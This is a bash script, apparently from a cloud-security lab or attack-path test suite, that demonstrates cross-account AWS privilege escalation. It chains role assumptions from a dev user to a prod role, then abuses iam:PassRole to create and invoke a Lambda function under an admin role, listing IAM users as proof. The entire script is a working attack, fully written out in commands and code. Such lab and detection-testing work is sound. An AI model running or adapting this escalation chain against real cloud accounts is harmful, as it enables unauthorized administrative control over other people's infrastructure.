#!/bin/bash

# Cross-Account PassRole to Lambda Admin Attack Demo
# This script demonstrates multi-hop cross-account privilege escalation via PassRole to Lambda admin
# Path: pl-pathfinder-starting-user-dev -> pl-lambda-prod-updater -> pl-lambda-updater -> pl-Lambda-admin

set -e

echo "🚀 Starting Cross-Account PassRole to Lambda Admin Attack Demo"
echo "=============================================================="

# Check if AWS CLI is installed
if ! command -v aws &> /dev/null; then
    echo "❌ AWS CLI is not installed or not in PATH"
    exit 1
fi

# Check if we have the required profile
if ! aws sts get-caller-identity --profile pl-pathfinder-starting-user-dev &> /dev/null; then
    echo "❌ AWS profile 'pl-pathfinder-starting-user-dev' not found"
    echo "Please run: ./create_pathfinder_profiles.sh"
    exit 1
fi

echo "✅ AWS CLI and profile configured"

# Step 1: Assume the dev lambda-prod-updater role
echo ""
echo "📋 Step 1: Assuming dev lambda-prod-updater role..."
DEV_ACCOUNT_ID=$(aws sts get-caller-identity --profile pl-pathfinder-starting-user-dev --query 'Account' --output text)
DEV_ROLE_ARN="arn:aws:iam::${DEV_ACCOUNT_ID}:role/pl-lambda-prod-updater"

echo "Assuming role: $DEV_ROLE_ARN"

# Get temporary credentials for the dev role
DEV_TEMP_CREDS=$(aws sts assume-role \
    --profile pl-pathfinder-starting-user-dev \
    --role-arn "$DEV_ROLE_ARN" \
    --role-session-name "lambda-prod-updater-session" \
    --output json)

if [ $? -ne 0 ]; then
    echo "❌ Failed to assume dev lambda-prod-updater role"
    exit 1
fi

# Extract credentials
export AWS_ACCESS_KEY_ID=$(echo $DEV_TEMP_CREDS | jq -r '.Credentials.AccessKeyId')
export AWS_SECRET_ACCESS_KEY=$(echo $DEV_TEMP_CREDS | jq -r '.Credentials.SecretAccessKey')
export AWS_SESSION_TOKEN=$(echo $DEV_TEMP_CREDS | jq -r '.Credentials.SessionToken')
export AWS_DEFAULT_REGION="us-west-2"

echo "✅ Successfully assumed dev lambda-prod-updater role"
    
# Step 2: Get the prod account ID and assume the prod lambda-updater role
echo ""
echo "📋 Step 2: Getting prod account ID and assuming prod lambda-updater role..."

# Get the prod account ID using admin cleanup profile
PROD_ACCOUNT_ID=$(aws sts get-caller-identity --profile pl-admin-cleanup-prod --query 'Account' --output text)
PROD_ROLE_ARN="arn:aws:iam::${PROD_ACCOUNT_ID}:role/pl-lambda-updater"

echo "Found prod account: $PROD_ACCOUNT_ID"
echo "Assuming role: $PROD_ROLE_ARN"

# Assume the prod role using current dev role credentials
PROD_TEMP_CREDS=$(aws sts assume-role \
    --role-arn "$PROD_ROLE_ARN" \
    --role-session-name "lambda-updater-prod-session" \
    --output json)

if [ $? -ne 0 ]; then
    echo "❌ Failed to assume prod lambda-updater role"
    exit 1
fi

# Extract prod credentials
export AWS_ACCESS_KEY_ID=$(echo $PROD_TEMP_CREDS | jq -r '.Credentials.AccessKeyId')
export AWS_SECRET_ACCESS_KEY=$(echo $PROD_TEMP_CREDS | jq -r '.Credentials.SecretAccessKey')
export AWS_SESSION_TOKEN=$(echo $PROD_TEMP_CREDS | jq -r '.Credentials.SessionToken')

echo "✅ Successfully assumed prod lambda-updater role"
        
# Step 3: Test PassRole privilege escalation
echo ""
echo "📋 Step 3: Testing PassRole privilege escalation..."
echo "The lambda-updater role has iam:PassRole permission."
echo "We can now create a Lambda function that uses the Lambda-admin role."

# Create a simple Lambda function that uses the admin role
echo "Creating a Lambda function with admin role..."
        
# Create a simple Python function (Python runtime has boto3 built-in)
cat > /tmp/lambda_function.py << 'EOF'
import boto3
import json

def lambda_handler(event, context):
    try:
        # Create IAM client to demonstrate admin access
        iam = boto3.client('iam')
        
        # List all users to demonstrate admin access
        response = iam.list_users()
        users = response.get('Users', [])
        
        return {
            'statusCode': 200,
            'body': json.dumps({
                'message': 'Lambda function executed with admin privileges!',
                'userCount': len(users),
                'users': [user['UserName'] for user in users]
            })
        }
    except Exception as error:
        return {
            'statusCode': 500,
            'body': json.dumps({
                'error': str(error)
            })
        }
EOF

# Create a zip file
cd /tmp
zip -q lambda_function.zip lambda_function.py

# Get the Lambda admin role ARN
LAMBDA_ADMIN_ROLE_ARN="arn:aws:iam::${PROD_ACCOUNT_ID}:role/pl-Lambda-admin"
echo "Using Lambda admin role: $LAMBDA_ADMIN_ROLE_ARN"
        
# Create the Lambda function
LAMBDA_RESULT=$(aws lambda create-function \
    --function-name "pl-privesc-demo-$(date +%s)" \
    --runtime "python3.9" \
    --role "$LAMBDA_ADMIN_ROLE_ARN" \
    --handler "lambda_function.lambda_handler" \
    --zip-file "fileb://lambda_function.zip" \
    --output json)

if [ $? -eq 0 ]; then
    echo "✅ Successfully created Lambda function with admin role! Waiting for 5 seconds..."
    FUNCTION_NAME=$(echo "$LAMBDA_RESULT" | jq -r '.FunctionName')
    echo "Function name: $FUNCTION_NAME"

    # Sleep for 5 seconds
    sleep 5
    
    # Step 4: Test the Lambda function
    echo ""
    echo "📋 Step 4: Testing the Lambda function..."
    echo "Invoking the Lambda function to test admin access..."
            
    INVOKE_RESULT=$(aws lambda invoke \
        --function-name "$FUNCTION_NAME" \
        --payload '{}' \
        /tmp/lambda_response.json \
        --output json)
    
    if [ $? -eq 0 ]; then
        echo "✅ Lambda function invocation completed"
        echo "Response:"
        cat /tmp/lambda_response.json | jq '.'
        echo ""
        
        # Check if the function returned an error
        if cat /tmp/lambda_response.json | jq -e '.errorType' > /dev/null 2>&1; then
            echo "❌ Lambda function executed but there was an error"
            ERROR_TYPE=$(cat /tmp/lambda_response.json | jq -r '.errorType')
            ERROR_MESSAGE=$(cat /tmp/lambda_response.json | jq -r '.errorMessage')
            echo "Error Type: $ERROR_TYPE"
            echo "Error Message: $ERROR_MESSAGE"
            ATTACK_SUCCESS=false
        # Check if the function returned the success message (indicating admin access)
        elif cat /tmp/lambda_response.json | grep -q "Lambda function executed with admin privileges!"; then
            echo "✅ SUCCESS: Lambda function has admin access!"
            echo "The function was able to list IAM users, proving admin privileges."
            ATTACK_SUCCESS=true
        else
            echo "❌ Lambda function executed but did not demonstrate admin access"
            echo "Expected success message not found in response"
            ATTACK_SUCCESS=false
        fi
        
    else
        echo "❌ Failed to invoke Lambda function"
        ATTACK_SUCCESS=false
    fi
           
                
else
    echo "❌ Failed to create Lambda function with admin role"
    echo "This could be because:"
    echo "1. The lambda-updater role doesn't have iam:PassRole permission"
    echo "2. The Lambda-admin role doesn't exist or isn't properly configured"
    echo "3. There are other policy restrictions"
    exit 1
fi
        
# Clean up temporary files
rm -f /tmp/lambda_function.py /tmp/lambda_function.zip /tmp/lambda_response.json

# Unset the environment variables
unset AWS_ACCESS_KEY_ID
unset AWS_SECRET_ACCESS_KEY
unset AWS_SESSION_TOKEN

echo ""
if [ "$ATTACK_SUCCESS" = "true" ]; then
    echo "✅ ATTACK SUCCESSFUL!"
    echo "======================"
    echo "The attack successfully demonstrated multi-hop privilege escalation:"
    echo "1. Dev user pl-pathfinder-starting-user-dev assumed dev role pl-lambda-prod-updater"
    echo "2. Dev role pl-lambda-prod-updater assumed prod role pl-lambda-updater"
    echo "3. Used iam:PassRole permission to create Lambda with admin role"
    echo "4. Lambda function executed with full admin privileges"
    echo "5. Confirmed admin access by listing IAM users"
    echo ""
    echo "⚠️  This demonstrates a critical multi-hop cross-account privilege escalation vulnerability!"

    # Output standardized test results
    echo "TEST_RESULT:x-account-from-dev-to-prod-role-assumption-passrole-to-lambda-admin:SUCCESS"
    echo "TEST_DETAILS:x-account-from-dev-to-prod-role-assumption-passrole-to-lambda-admin:Successfully demonstrated multi-hop cross-account PassRole privilege escalation to Lambda admin"
    echo "TEST_METRICS:x-account-from-dev-to-prod-role-assumption-passrole-to-lambda-admin:dev_role_assumed=true,prod_role_assumed=true,lambda_created=true,admin_access_confirmed=true"
else
    echo "❌ ATTACK FAILED!"
    echo "=================="
    echo "The attack partially succeeded but failed to achieve admin privileges:"
    echo "1. ✅ Dev user pl-pathfinder-starting-user-dev assumed dev role pl-lambda-prod-updater"
    echo "2. ✅ Dev role pl-lambda-prod-updater assumed prod role pl-lambda-updater"
    echo "3. ✅ Used iam:PassRole permission to create Lambda with admin role"
    echo "4. ❌ Lambda function execution failed or did not demonstrate admin privileges"
    echo ""
    echo "The Lambda function was created successfully but failed to execute properly or demonstrate admin access."

    # Output standardized test results
    echo "TEST_RESULT:x-account-from-dev-to-prod-role-assumption-passrole-to-lambda-admin:FAILURE"
    echo "TEST_DETAILS:x-account-from-dev-to-prod-role-assumption-passrole-to-lambda-admin:Lambda function created but failed to demonstrate admin access"
    echo "TEST_METRICS:x-account-from-dev-to-prod-role-assumption-passrole-to-lambda-admin:dev_role_assumed=true,prod_role_assumed=true,lambda_created=true,admin_access_confirmed=false"
    exit 1
fi
